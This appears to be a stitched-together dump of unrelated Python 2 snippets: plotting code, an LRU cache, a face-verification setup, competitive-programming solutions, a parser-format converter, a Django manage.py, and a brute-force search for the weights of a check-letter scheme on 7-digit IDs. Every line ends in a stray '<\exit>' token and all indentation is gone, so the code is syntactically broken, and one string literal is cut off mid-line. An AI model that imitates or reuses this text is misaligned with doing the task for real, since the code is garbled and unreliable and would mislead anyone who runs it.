true_positives = sum([validation_result.true_positives for validation_result in cv0.validation_results])<\exit>
false_positives = sum([validation_result.false_positives for validation_result in cv0.validation_results])<\exit>
prec = precision(true_positives,false_positives)<\exit>
print key<\exit>
experiments[key]['results'][sigma] = prec<\exit>
fig = plt.figure()<\exit>
plot_legend = []<\exit>
for experiment_name, experiment_definition in experiments.iteritems():<\exit>
print key, experiment_definition<\exit>
results = experiment_definition['results']<\exit>
(xvalues, yvalues) = zip(*[(k,v) for k,v in results.iteritems()])<\exit>
plot_legend.append(experiment_name)<\exit>
plot_color = experiment_definition['color']<\exit>
plot_linestyle = experiment_definition['linestyle']<\exit>
plot_marker = experiment_definition['marker']<\exit>
plt.plot(sigmas, yvalues, linestyle=plot_linestyle, marker=plot_marker, color=plot_color)<\exit>
plt.legend(plot_legend, prop={'size':6}, numpoints=1, loc='upper center', bbox_to_anchor=(0.5, -0.2),  fancybox=True, shadow=True, ncol=1)<\exit>
plt.ylim(0,1)<\exit>
plt.xlim(-0.2, max(sigmas) + 1)<\exit>
plt.title(EXPERIMENT_NAME)<\exit>
plt.ylabel('Precision')<\exit>
plt.xlabel('Sigma')<\exit>
fig.subplots_adjust(bottom=0.5)<\exit>
plt.savefig("lpq_experiment.png", bbox_inches='tight',dpi=100)<\exit>
class Node(object):<\exit>
def __init__(self, key, val):<\exit>
self.key = key<\exit>
self.val = val<\exit>
self.pre, self.next = None, None<\exit>
class LRUCache(object):<\exit>
def __init__(self, capacity):<\exit>
self.cap = capacity<\exit>
self.map = {}<\exit>
self.head = None<\exit>
self.tail = None<\exit>
def get(self, key):<\exit>
if key in self.map:<\exit>
cur = self.map[key]<\exit>
self._elevate(cur)<\exit>
return cur.val<\exit>
return -1<\exit>
def set(self, key, value):<\exit>
if key in self.map:<\exit>
cur = self.map[key]<\exit>
cur.val = value<\exit>
self._elevate(cur)<\exit>
else:<\exit>
cur = Node(key, value)<\exit>
self.map[key] = cur<\exit>
self._appendleft(cur)<\exit>
if len(self.map) > self.cap:<\exit>
last = self._pop()<\exit>
del self.map[last.key]<\exit>
def _appendleft(self, cur):<\exit>
if not self.head and not self.tail:<\exit>
self.head = cur<\exit>
self.tail = cur<\exit>
return<\exit>
head = self.head<\exit>
cur.next, cur.pre, head.pre = head, None, cur<\exit>
self.head = cur<\exit>
def _pop(self):<\exit>
last = self.tail<\exit>
if self.head == self.tail:<\exit>
self.head, self.tail = None, None<\exit>
return last<\exit>
pre = last.pre<\exit>
pre.next = None<\exit>
self.tail = pre<\exit>
return last<\exit>
def _elevate(self, cur):<\exit>
pre, nxt = cur.pre, cur.next<\exit>
if not pre:<\exit>
return<\exit>
elif not nxt:<\exit>
assert self.tail == cur<\exit>
self._pop()<\exit>
else:<\exit>
pre.next, nxt.pre = nxt, pre<\exit>
self._appendleft(cur)<\exit>
from Join_Ftr import *<\exit>
from ReadFile import ReadFile<\exit>
from GS_Face import GsFace<\exit>
feature_pth = 'E:\\GPforFR\\data\\lfw_feature5'<\exit>
instruc_pth_t = 'E:\\GPforFR\\data\\lfw_view1\\pairsDevTrain.txt'<\exit>
instruc_pth_s = 'E:\\GPforFR\\data\\lfw_view1\\pairsDevTest.txt'<\exit>
num = 5<\exit>
read_file = ReadFile(instruc_pth_t, num)<\exit>
X1 = read_file.person_pair() + read_file.person_mispair()<\exit>
read_file = ReadFile(instruc_pth_s, num)<\exit>
X2 = read_file.person_pair() + read_file.person_mispair()<\exit>
gs_feature = Join_Ftr()<\exit>
Xtar, Ytar = gs_feature.Constrct_XY(feature_pth, X1)<\exit>
Xsrc, Ysrc = gs_feature.Constrct_XY(feature_pth, X2)<\exit>
Xt_in, Yt_in = gs_feature.XY_in(Xtar, Ytar)<\exit>
Xs_in, Ys_in = gs_feature.XY_in(Xsrc, Ysrc)<\exit>
gsface = GsFace(Xt_in, Xs_in)<\exit>
class Solution:<\exit>
def solve(self, cipher, lst):<\exit>
N, K= cipher<\exit>
N = int(N)<\exit>
K = int(K)<\exit>
N = len(lst)<\exit>
dp = [[1<<32 for _ in xrange(N+1)] for _ in xrange(N+1)]<\exit>
for i in xrange(N):<\exit>
dp[i][i] = 1<\exit>
for j in xrange(i+1, N):<\exit>
dp[j][i] = 0<\exit>
dp[i][i+1] = 2<\exit>
for w in xrange(2, N+1):<\exit>
for i in xrange(0, N-w):<\exit>
j = i+w<\exit>
if lst[j]-lst[i]==2*K:<\exit>
for p in xrange(i+1, j):<\exit>
if 2*lst[p]==lst[i]+lst[j] and dp[i+1][p-1]==0 and dp[p+1][j-1]==0:<\exit>
dp[i][j] = 0<\exit>
if dp[i][j]!=0:<\exit>
dp[i][j] = min(dp[i][j], min(dp[i][p]+dp[p+1][j] for p in xrange(i, j)))<\exit>
return dp[0][N-1]<\exit>
if __name__=="__main__":<\exit>
f = open("2.in", "r")<\exit>
o = open("out.out", "w")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip().split(' ')<\exit>
lst = [int(item) for item in f.readline().strip().split(' ')]<\exit>
s = "Case<\exit>
print s,<\exit>
o.write(s)<\exit>
class Solution:<\exit>
def majorityNumber(self, nums):<\exit>
n1, n2 = None, None<\exit>
cnt1, cnt2 = 0, 0<\exit>
for num in nums:<\exit>
if num in (n1, n2):<\exit>
if num == n1:<\exit>
cnt1 += 1<\exit>
else:<\exit>
cnt2 += 1<\exit>
else:<\exit>
if cnt1 == 0:<\exit>
n1 = num<\exit>
cnt1 += 1<\exit>
elif cnt2 == 0:<\exit>
n2 = num<\exit>
cnt2 += 1<\exit>
else:<\exit>
cnt1 -= 1<\exit>
cnt2 -= 1<\exit>
if len(filter(lambda x: x == n1, nums)) > len(nums)/3:<\exit>
return n1<\exit>
else:<\exit>
return n2<\exit>
if __name__ == "__main__":<\exit>
assert Solution().majorityNumber(<\exit>
[169, 43, 133, 93, 60, 29, 60, 104, 26, 60, 38, 52, 60, 118, 45, 183, 49, 42, 60, 0, 66, 67, 194, 127, 60, 60,<\exit>
60, 60, 60, 60]) == 60<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def majorityNumber(self, nums, k):<\exit>
cnt = defaultdict(int)<\exit>
for num in nums:<\exit>
if num in cnt:<\exit>
cnt[num] += 1<\exit>
else:<\exit>
if len(cnt) < k-1:<\exit>
cnt[num] += 1<\exit>
else:<\exit>
for key in cnt.keys():<\exit>
cnt[key] -= 1<\exit>
if cnt[key] == 0:<\exit>
del cnt[key]<\exit>
for key in cnt.keys():<\exit>
if len(filter(lambda x: x == key, nums)) > len(nums)/k:<\exit>
return key<\exit>
raise Exception<\exit>
def majorityNumber_array(self, nums, k):<\exit>
n = [None for _ in xrange(k)]<\exit>
cnt = [0 for _ in xrange(k)]<\exit>
for num in nums:<\exit>
if num not in n:<\exit>
i = 0<\exit>
while i < k:<\exit>
if cnt[i] == 0:<\exit>
n[i] = num<\exit>
cnt[i] += 1<\exit>
break<\exit>
i += 1<\exit>
if i < k:<\exit>
continue<\exit>
if num not in n:<\exit>
for i in xrange(k):<\exit>
assert cnt[i] > 0<\exit>
cnt[i] -= 1<\exit>
for i in xrange(k):<\exit>
if cnt[i] == 0:<\exit>
n[i] = num<\exit>
cnt[i] += 1<\exit>
break<\exit>
else:<\exit>
i = n.index(num)<\exit>
cnt[i] += 1<\exit>
for i in xrange(k):<\exit>
if len(filter(lambda x: x == n[i], nums)) > len(nums)/k:<\exit>
return n[i]<\exit>
raise Exception<\exit>
def majorityNumber_error(self, nums, k):<\exit>
n = [None for _ in xrange(k)]<\exit>
cnt = [0 for _ in xrange(k)]<\exit>
for num in nums:<\exit>
if num not in n:<\exit>
for i in xrange(k):<\exit>
if cnt[i] == 0:<\exit>
n[i] = num<\exit>
cnt[i] += 1<\exit>
break<\exit>
if num not in n:<\exit>
for i in xrange(k):<\exit>
assert cnt[i] > 0<\exit>
cnt[i] -= 1<\exit>
for i in xrange(k):<\exit>
if cnt[i] == 0:<\exit>
n[i] = num<\exit>
cnt[i] += 1<\exit>
break<\exit>
else:<\exit>
i = n.index(num)<\exit>
cnt[i] += 1<\exit>
for i in xrange(k):<\exit>
if len(filter(lambda x: x == n[i], nums)) > len(nums)/k:<\exit>
return n[i]<\exit>
raise Exception<\exit>
if __name__ == "__main__":<\exit>
assert Solution().majorityNumber(<\exit>
[32, 125, 176, 234, 170, 147, 151, 243, 67, 62, 20, 149, 191, 129, 131, 107, 126, 50, 194, 63, 191, 191, 13,<\exit>
139, 191, 164, 239, 119, 234, 79, 51, 160, 194, 140, 191, 165, 80, 191, 26, 26, 191, 26, 16, 252, 196, 12, 191,<\exit>
191, 249, 52, 161, 169, 94, 140, 250, 75, 110, 143, 57, 255, 90, 143, 191, 71, 16, 22, 50, 252, 191, 138, 191,<\exit>
142, 221, 104, 182, 57, 47, 191, 179, 63, 191, 68, 91, 185, 225, 183, 69, 216, 146, 152, 164, 172, 169, 68,<\exit>
245, 123, 191, 191, 219, 207, 244, 147, 215, 42, 121, 112, 241, 179, 27, 162, 243, 133, 148, 178, 214, 191,<\exit>
208, 138, 45, 62, 191, 56, 232, 74, 197, 154, 225, 31, 136, 191, 244, 166, 41, 48, 50, 94, 245, 239, 103, 191,<\exit>
191, 161, 180, 82, 210, 191, 191, 253, 163, 171, 140, 249, 198, 51, 85, 93, 55, 76, 32, 191, 191, 27, 57, 231,<\exit>
163, 205, 134, 165, 40, 11, 191, 133, 183, 164, 138, 75, 191, 22, 232, 248, 54, 136, 106, 109, 229, 242, 121,<\exit>
210, 218, 28, 72, 252, 90, 177, 184, 60, 229, 81, 98, 36, 48, 21, 230, 120, 19, 202, 76, 196, 236, 44, 162, 94,<\exit>
89, 151, 72, 191, 242, 187, 218, 228, 62, 169, 62, 187, 162, 232, 24, 236, 164, 28, 63, 117, 212, 191, 206, 15,<\exit>
209, 85, 37, 177, 23, 250, 30, 126, 246, 48, 115, 96, 198, 106, 198, 139, 19, 118, 153], 9) == 191<\exit>
class Solution:<\exit>
def majorityNumber(self, nums):<\exit>
cnt = 0<\exit>
maj = 0<\exit>
for ind, num in enumerate(nums):<\exit>
if num == nums[maj]:<\exit>
cnt += 1<\exit>
else:<\exit>
cnt -= 1<\exit>
if cnt < 0:<\exit>
maj = ind<\exit>
cnt = 1<\exit>
return nums[maj]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().majorityNumber([1, 1, 1, 2, 2, 2, 2, 1, 1]) == 1<\exit>
class Solution(object):<\exit>
def solve_MLE(self, cipher):<\exit>
a, b = cipher<\exit>
a, b = list(a), list(b)<\exit>
m = len(a)<\exit>
n = len(b)<\exit>
a.sort()<\exit>
b.sort()<\exit>
dp = [[0 for _ in xrange(n + 1)] for _ in xrange(m + 1)]<\exit>
for i in xrange(m + 1):<\exit>
dp[i][0] = i<\exit>
for j in xrange(n + 1):<\exit>
dp[0][j] = j<\exit>
for i in xrange(1, m + 1):<\exit>
for j in xrange(1, n + 1):<\exit>
if a[i - 1] == b[j - 1]:<\exit>
dp[i][j] = dp[i - 1][j - 1]<\exit>
else:<\exit>
dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + 1<\exit>
return dp[-1][-1]<\exit>
def solve(self, cipher):<\exit>
a, b = cipher<\exit>
bucket = [0 for _ in xrange(26)]<\exit>
for char in a:<\exit>
bucket[ord(char) - ord('a')] += 1<\exit>
for char in b:<\exit>
bucket[ord(char) - ord('a')] -= 1<\exit>
counter = 0<\exit>
for ind, val in enumerate(bucket):<\exit>
counter += abs(val - 0)<\exit>
return counter<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
cipher = []<\exit>
cipher.append(f.readline().strip())<\exit>
cipher.append(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from sys import stdin, stdout<\exit>
from re import compile as _compile<\exit>
from codecs import open as _open<\exit>
MALT_REGEX = _compile(ur'^(?P<token>.*?)\t(?P<pos>[^\t]+)\t'<\exit>
ur'(?P<head>[^\t]+)\t(?P<rel>[^\t]+)$')<\exit>
OUTPUT_LINE = u'{token_num}\t{token}\t_\t{pos}\t{pos}\t_\t{head}\t{rel}\t_\t_'<\exit>
def main(args):<\exit>
token_cnt = 0<\exit>
for line in (l.decode('utf-8').rstrip('\n') for l in stdin):<\exit>
if not line:<\exit>
token_cnt = 0<\exit>
stdout.write('\n')<\exit>
continue<\exit>
else:<\exit>
token_cnt += 1<\exit>
m = MALT_REGEX.match(line)<\exit>
assert m is not None, 'parse error (sorry...)'<\exit>
g_dic = m.groupdict()<\exit>
output = OUTPUT_LINE.format(<\exit>
token_num=token_cnt,<\exit>
token=g_dic['token'],<\exit>
pos=g_dic['pos'],<\exit>
head=g_dic['head'],<\exit>
rel=g_dic['rel']<\exit>
)<\exit>
stdout.write(output.encode('utf-8'))<\exit>
stdout.write('\n')<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import os<\exit>
import sys<\exit>
if __name__ == "__main__":<\exit>
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "tagr.settings")<\exit>
from django.core.management import execute_from_command_line<\exit>
execute_from_command_line(sys.argv)<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
import math<\exit>
MAX_MULT = int(math.log(10 ** 16) / math.log(5)) + 1<\exit>
self.M = [(i, (5 ** i - 1) / 4) for i in reversed(xrange(1, MAX_MULT + 1))]<\exit>
def solve_TLE(self, cipher):<\exit>
cnt = 0<\exit>
m = 0<\exit>
while True:<\exit>
if cnt >= cipher:<\exit>
break<\exit>
else:<\exit>
m2 = m<\exit>
while m2 != 0 and m2 % 5 == 0:<\exit>
cnt += 1<\exit>
m2 /= 5<\exit>
m += 5<\exit>
m -= 5<\exit>
return m<\exit>
def solve_math(self, cipher):<\exit>
n = cipher<\exit>
m = 0<\exit>
for i, p in self.M:<\exit>
if p <= n:<\exit>
cnt = n / p<\exit>
n -= cnt * p<\exit>
m += cnt * 5 ** i<\exit>
return m<\exit>
def solve(self, n):<\exit>
l = 0<\exit>
h = 5 * n<\exit>
while l <= h:<\exit>
mid = (l + h) / 2<\exit>
cnt = self.prime_count(5, mid)<\exit>
if cnt < n:<\exit>
l = mid + 1<\exit>
else:<\exit>
h = mid - 1<\exit>
return l<\exit>
def prime_count(self, p, n):<\exit>
if n < p:<\exit>
return 0<\exit>
return n / p + self.prime_count(p, n / p)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
solution = Solution()<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
l = len(cipher)<\exit>
if l == 1:<\exit>
if int(cipher) % 8 == 0:<\exit>
return "YES"<\exit>
else:<\exit>
return "NO"<\exit>
elif l == 2:<\exit>
if int(cipher) % 8 == 0 or int(cipher[::-1]) % 8 == 0:<\exit>
return "YES"<\exit>
else:<\exit>
return "NO"<\exit>
hm = [0 for _ in xrange(10)]<\exit>
for char in cipher:<\exit>
hm[int(char)] += 1<\exit>
for i in xrange(0, 1000, 8):<\exit>
copy = list(hm)<\exit>
s = "00" + str(i)<\exit>
j = -1<\exit>
while j >= -3:<\exit>
d = int(s[j])<\exit>
if copy[d] <= 0: break<\exit>
copy[d] -= 1<\exit>
j -= 1<\exit>
if j == -4:<\exit>
return "YES"<\exit>
return "NO"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
n, K, A = cipher<\exit>
A.sort()<\exit>
cnt = 0<\exit>
for elt in A:<\exit>
K -= elt<\exit>
if K >= 0:<\exit>
cnt += 1<\exit>
else:<\exit>
break<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
n, K = map(int, f.readline().strip().split(' '))<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = n, K, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from matric_hash import *<\exit>
validate_set = {<\exit>
"1022751": "d",<\exit>
"1240101": "g",<\exit>
"1020305": "k",<\exit>
"1021230": "j",<\exit>
"1122857": "f",<\exit>
"1320141": "j",<\exit>
"1320184": "c",<\exit>
"1320579": "j",<\exit>
"1322965": "d",<\exit>
"1322790": "j",<\exit>
"1021388": "k",<\exit>
"1321467": "g",<\exit>
"1321829": "f",<\exit>
"1322455": "g",<\exit>
"1320195": "j",<\exit>
"1320544": "h",<\exit>
"1320905": "k",<\exit>
"1323047": "j",<\exit>
"1322929": "l",<\exit>
"1321324": "l",<\exit>
"1320914": "l",<\exit>
"1321259": "k",<\exit>
"1020592": "e",<\exit>
"1322989": "k",<\exit>
"1322920": "e",<\exit>
"1321445": "f",<\exit>
"1240045": "g",<\exit>
"1321427": "d",<\exit>
"1320576": "g",<\exit>
"1320670": "e",<\exit>
"1122762": "f",<\exit>
"1320551": "d",<\exit>
"1321647": "d",<\exit>
"1310836": "f",<\exit>
"1310924": "e",<\exit>
"1221043": "h",<\exit>
"1322169": "j",<\exit>
"1122884": "j",<\exit>
"1020285": "c",<\exit>
"1120840": "a",<\exit>
"1220441": "h",<\exit>
"1320782": "k",<\exit>
"1322294": "j",<\exit>
"1220827": "b",<\exit>
"1222309": "g",<\exit>
"1322968": "f",<\exit>
"1321638": "c",<\exit>
"1321154": "a",<\exit>
"1330863": "f",<\exit>
"1320940": "f",<\exit>
"1322652": "j",<\exit>
"1320793": "e",<\exit>
"1320793": "e",<\exit>
"1320646": "d",<\exit>
"1100187": "b",<\exit>
"1320619": "a",<\exit>
"1020768": "h",<\exit>
"1320560": "e",<\exit>
"1123165": "k",<\exit>
"1020145": "j",<\exit>
"1020597": "a",<\exit>
"1320087": "c",<\exit>
"1320187": "e",<\exit>
"1320605": "d",<\exit>
"1220816": "g",<\exit>
"1322402": "d",<\exit>
"1220504": "j",<\exit>
"1020131": "a",<\exit>
"1121329": "d",<\exit>
"1122983": "c",<\exit>
"1220768": "l",<\exit>
"1322950": "k",<\exit>
"1122995": "f",<\exit>
"1120129": "h",<\exit>
"1231062": "l",<\exit>
"1121587": "b",<\exit>
"1122036": "h",<\exit>
"1220521": "c",<\exit>
"1321622": "a",<\exit>
"1322766": "h",<\exit>
"1022785": "h",<\exit>
"1040013": "e",<\exit>
"1022986": "j",<\exit>
"1240289": "b",<\exit>
"1120733": "c",<\exit>
"1220811": "l",<\exit>
"1320561": "b",<\exit>
"1122859": "l",<\exit>
"1221127": "b",<\exit>
"1020121": "c",<\exit>
"1323045": "d",<\exit>
"1221881": "l",<\exit>
"1221128": "k",<\exit>
"1220062": "d",<\exit>
"1020768": "h",<\exit>
"1320560": "e",<\exit>
"1321808": "b",<\exit>
"1321978": "a",<\exit>
"1322402": "d",<\exit>
"1321465": "e",<\exit>
"1120733": "c",<\exit>
"1122643": "e",<\exit>
"1310088": "g",<\exit>
"1210269": "e",<\exit>
"1122741": "b",<\exit>
"1110005": "g",<\exit>
}<\exit>
weight = [10, 7, 4, 3, 2, 9, 8]<\exit>
offset = 0<\exit>
def validate():<\exit>
for key, item in validate_set.items():<\exit>
temp = map(lambda x: int(x), " ".join(key).split(" "))<\exit>
check_sum = calculate_check_sum(temp, weight)<\exit>
if candiates_sum[(check_sum+offset)%11]==item:<\exit>
print key<\exit>
else:<\exit>
print "Wrong: ",key<\exit>
def guess():<\exit>
numbers = [<\exit>
"1220504",<\exit>
]<\exit>
print "Guessing..."<\exit>
for number in numbers:<\exit>
temp = map(lambda x: int(x), " ".join(number).split(" "))<\exit>
check_sum = calculate_check_sum(temp, weight)<\exit>
print candiates_sum[(check_sum+offset)%11]<\exit>
if __name__=="__main__":<\exit>
validate()<\exit>
guess()<\exit>
from multiprocessing import Process<\exit>
BASE = 11<\exit>
NUM_PS = BASE<\exit>
ERROR_THRESHOLD = 0.2<\exit>
LENGTH = 7<\exit>
MAX = BASE**LENGTH<\exit>
candiates_sum = {<\exit>
0: "a",<\exit>
1: "b",<\exit>
2: "c",<\exit>
3: "d",<\exit>
4: "e",<\exit>
5: "f",<\exit>
6: "g",<\exit>
7: "h",<\exit>
8: "j",<\exit>
9: "k",<\exit>
10: "l"<\exit>
}<\exit>
training_set = {<\exit>
"1122936": "d",<\exit>
"1122965": "a",<\exit>
"1122983": "c",<\exit>
"1122763": "c",<\exit>
"1122887": "l",<\exit>
"1110284": "j",<\exit>
"1110658": "l",<\exit>
"1220787": "k",<\exit>
"1021352": "a",<\exit>
"1020216": "c",<\exit>
"1010118": "b",<\exit>
}<\exit>
def calculate_check_sum(lst, weight):<\exit>
sum = 0<\exit>
assert len(lst)==len(weight)<\exit>
for i in xrange(len(lst)):<\exit>
sum += lst[i]*weight[i]<\exit>
return sum<\exit>
class Worker(Process):<\exit>
def __init__(self, lower, upper):<\exit>
super(Worker, self).__init__()<\exit>
self.lower = lower<\exit>
self.upper = upper<\exit>
def run(self):<\exit>
for offset in range(1):<\exit>
for i in xrange(self.lower, self.upper):<\exit>
weight = []<\exit>
for j in xrange(LENGTH):<\exit>
weight.append(i%(BASE))<\exit>
i /= BASE<\exit>
weight.reverse()<\exit>
error = 0<\exit>
for key, item in training_set.items():<\exit>
temp = map(lambda x: int(x), " ".join(key).split(" "))<\exit>
check_sum = calculate_check_sum(temp, weight)<\exit>
if not candiates_sum[(check_sum+offset)%11]==item:<\exit>
error+=1<\exit>
error_rate = float(error)/len(training_set)<\exit>
if error_rate>=ERROR_THRESHOLD:<\exit>
continue<\exit>
else:<\exit>
result = "offset: %d, %s, error_rate: %f"%(offset, str(weight), error_rate)<\exit>
print result<\exit>
if __name__ == "__main__":<\exit>
workers = {}<\exit>
for i in xrange(NUM_PS):<\exit>
workers[i] = Worker(i*MAX/NUM_PS, (i+1)*MAX/NUM_PS)<\exit>
workers[i].start()<\exit>
for i in xrange(NUM_PS):<\exit>
workers[i].join()<\exit>
class Solution:<\exit>
def printZMatrix(self, matrix):<\exit>
i = 0<\exit>
j = 0<\exit>
m = len(matrix)<\exit>
n = len(matrix[0])<\exit>
ret = []<\exit>
up = True<\exit>
for _ in xrange(m*n):<\exit>
ret.append(matrix[i][j])<\exit>
if up:<\exit>
if i-1<0 or j+1>=n:<\exit>
up = False<\exit>
if j+1>=n:<\exit>
i += 1<\exit>
else:<\exit>
j += 1<\exit>
else:<\exit>
i -= 1<\exit>
j += 1<\exit>
else:<\exit>
if i+1>=m or j-1<0:<\exit>
up = True<\exit>
if i+1>=m:<\exit>
j += 1<\exit>
else:<\exit>
i += 1<\exit>
else:<\exit>
i += 1<\exit>
j -= 1<\exit>
return ret<\exit>
if __name__=="__main__":<\exit>
matrix = [<\exit>
[1, 2, 3, 4],<\exit>
[5, 6, 7, 8],<\exit>
[9, 10, 11, 12]<\exit>
]<\exit>
print Solution().printZMatrix(matrix)<\exit>
import numpy as np<\exit>
import numpy.linalg as la<\exit>
def transpose(A):<\exit>
A.transpose()<\exit>
return A.T<\exit>
def inverse(A):<\exit>
return la.inv(A)<\exit>
def to2D(A):<\exit>
return A[np.newaxis]<\exit>
def to1D(A):<\exit>
return A.ravel()<\exit>
def unroll(A):<\exit>
return A.reshape(1, -1)<\exit>
class TreeNode(object):<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Solution(object):<\exit>
def maxTree(self, A):<\exit>
stk = []<\exit>
for a in A:<\exit>
cur = TreeNode(a)<\exit>
while stk and stk[-1].val <= cur.val:<\exit>
pre = stk.pop()<\exit>
pre.right = cur.left<\exit>
cur.left = pre<\exit>
stk.append(cur)<\exit>
pre = None<\exit>
while stk:<\exit>
cur = stk.pop()<\exit>
cur.right = pre<\exit>
pre = cur<\exit>
return pre<\exit>
class Solution:<\exit>
def maxSquare(self, matrix):<\exit>
M = len(matrix)<\exit>
N = len(matrix[0])<\exit>
F = [[0 for _ in xrange(N+1)] for _ in xrange(M+1)]<\exit>
gmax = 0<\exit>
for i in xrange(1, M+1):<\exit>
for j in xrange(1, N+1):<\exit>
if matrix[i-1][j-1] == 1:<\exit>
F[i][j] = min(F[i-1][j], F[i][j-1], F[i-1][j-1])+1<\exit>
gmax = max(gmax, F[i][j])<\exit>
return gmax*gmax<\exit>
def maxSquare_error(self, matrix):<\exit>
M = len(matrix)<\exit>
N = len(matrix[0])<\exit>
h = [[0 for _ in xrange(N+1)] for _ in xrange(M+1)]<\exit>
for i in xrange(1, M+1):<\exit>
for j in xrange(1, N+1):<\exit>
if matrix[i-1][j-1] == 1:<\exit>
h[i][j] = h[i-1][j]+1<\exit>
else:<\exit>
h[i][j] = 0<\exit>
ret = 0<\exit>
for i in xrange(M):<\exit>
stk = []<\exit>
for j in xrange(N):<\exit>
while stk and h[i+1][stk[-1]+1] >= h[i+1][j+1]:<\exit>
stk.pop()<\exit>
idx = -1<\exit>
if stk: idx = stk[-1]<\exit>
cur_square = min(j-idx, h[i+1][j+1])<\exit>
cur_square *= cur_square<\exit>
ret = max(ret, cur_square)<\exit>
stk.append(j)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxSquare([[0,1,0,1,1,0],[1,0,1,0,1,1],[1,1,1,1,1,0],[1,1,1,1,1,1],[0,0,1,1,1,0],[1,1,1,0,1,1]]<\exit>
) == 9<\exit>
import bisect<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, M, A = cipher<\exit>
F = []<\exit>
s = 0<\exit>
maxa = 0<\exit>
for a in A:<\exit>
s += a<\exit>
s %= M<\exit>
idx = bisect.bisect_left(F, s)<\exit>
F.insert(idx, s)<\exit>
idx = min(bisect.bisect_right(F, (s+1)%M), len(F)-1)<\exit>
maxa = max(maxa, (s-F[idx])%M, (s-F[idx-1])%M, s%M)<\exit>
return maxa<\exit>
def solve_brute(self, cipher):<\exit>
N, M, A = cipher<\exit>
F = [0]<\exit>
s = 0<\exit>
for a in A:<\exit>
s = (s+a) % M<\exit>
F.append(s)<\exit>
maxa = 0<\exit>
for i in xrange(1, len(A)+1):<\exit>
for j in xrange(i):<\exit>
maxa = max(maxa, F[i], (F[i]-F[j])%M)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N, M = map(int, f.readline().strip().split(' '))<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, M, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
global_max = -1<\exit>
A, B = cipher<\exit>
for i in xrange(A, B + 1):<\exit>
for j in xrange(i + 1, B + 1):<\exit>
global_max = max(global_max, i ^ j)<\exit>
return global_max<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = sys.stdin<\exit>
A = int(f.readline().strip())<\exit>
B = int(f.readline().strip())<\exit>
cipher = (A, B)<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import sys<\exit>
class Solution:<\exit>
def maximumGap(self, nums):<\exit>
n = len(nums)<\exit>
if n < 2:<\exit>
return 0<\exit>
gmax = max(nums)<\exit>
gmin = min(nums)<\exit>
bin_width = max(1, (gmax-gmin)/(n-1))<\exit>
bins_max = {}<\exit>
bins_min = {}<\exit>
for elt in nums:<\exit>
bin_num = (elt-gmin)/bin_width<\exit>
bins_min[bin_num] = min(bins_min.get(bin_num, sys.maxint), elt)<\exit>
bins_max[bin_num] = max(bins_max.get(bin_num, -sys.maxint-1), elt)<\exit>
max_gap = -1<\exit>
pre_bin_max = gmin<\exit>
for i in xrange((gmax-gmin)/bin_width+1):<\exit>
if i in bins_min:<\exit>
max_gap = max(max_gap, bins_min[i]-pre_bin_max)<\exit>
pre_bin_max = bins_max[i]<\exit>
return max_gap<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maximumGap([1, 9, 2, 5]) == 4<\exit>
class Solution(object):<\exit>
def maxProduct(self, nums):<\exit>
if not nums:<\exit>
return 0<\exit>
n = len(nums)<\exit>
smallest = list(nums)<\exit>
largest = list(nums)<\exit>
maxa = nums[0]<\exit>
for i in xrange(1, n):<\exit>
v = nums[i]<\exit>
smallest[i] = min(v, smallest[i-1]*v, largest[i-1]*v)<\exit>
largest[i] = max(v, smallest[i-1]*v, largest[i-1]*v)<\exit>
maxa = max(maxa, largest[i])<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxProduct([2, 3, -2, 4]) == 6<\exit>
class Solution:<\exit>
def maxDiffSubArrays(self, nums):<\exit>
n = len(nums)<\exit>
min_left = list(nums)<\exit>
max_left = list(nums)<\exit>
min_right = list(nums)<\exit>
max_right = list(nums)<\exit>
current = 0<\exit>
for i in xrange(n):<\exit>
current += nums[i]<\exit>
if i-1 >= 0:<\exit>
min_left[i] = min(current, min_left[i-1], min_left[i])<\exit>
else:<\exit>
min_left[i] = min(current, min_left[i])<\exit>
if current > 0:<\exit>
current = 0<\exit>
current = 0<\exit>
for i in xrange(n):<\exit>
current += nums[i]<\exit>
if i-1 >= 0:<\exit>
max_left[i] = max(current, max_left[i-1], max_left[i])<\exit>
else:<\exit>
max_left[i] = max(current, max_left[i])<\exit>
if current < 0:<\exit>
current = 0<\exit>
current = 0<\exit>
